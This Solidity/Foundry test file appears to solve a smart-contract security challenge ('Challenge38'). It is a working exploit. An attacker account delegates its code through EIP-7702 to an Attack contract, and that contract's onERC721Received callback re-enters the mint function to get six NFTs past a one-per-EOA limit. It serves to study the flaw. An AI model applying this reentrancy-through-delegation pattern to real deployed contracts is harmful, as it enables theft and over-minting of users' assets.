// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, Vm} from "forge-std/Test.sol";
import {UniqueNFT} from "../UniqueNFT.sol";
import {IERC721Receiver} from "@openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";

contract UniqueNFTTest is Test {
    UniqueNFT nft;
    Attack attack;
    uint256 attackerPk = 0xB0B;         // any known private key
    address attacker = vm.addr(attackerPk);

    function setUp() public {
        nft = new UniqueNFT();
        attack = new Attack();
    }
    function test_Challenge38_Passed() public {
        vm.startPrank(attacker, attacker);
        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(address(attack), attackerPk);
        vm.attachDelegation(signedDelegation);

        Attack(attacker).storeNFT(nft);
        nft.mintNFTEOA();
        vm.stopPrank();
        assertEq(nft.balanceOf(attacker), 6);
    }
}

contract Attack {
    UniqueNFT nft;
    uint8 count;

    function storeNFT(UniqueNFT _nft) public {
        nft = _nft;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns(bytes4) {
        if (count == 5) {
            return IERC721Receiver.onERC721Received.selector;
        } else {
            count++;
            nft.mintNFTEOA();
            return IERC721Receiver.onERC721Received.selector;
        }        
    }
}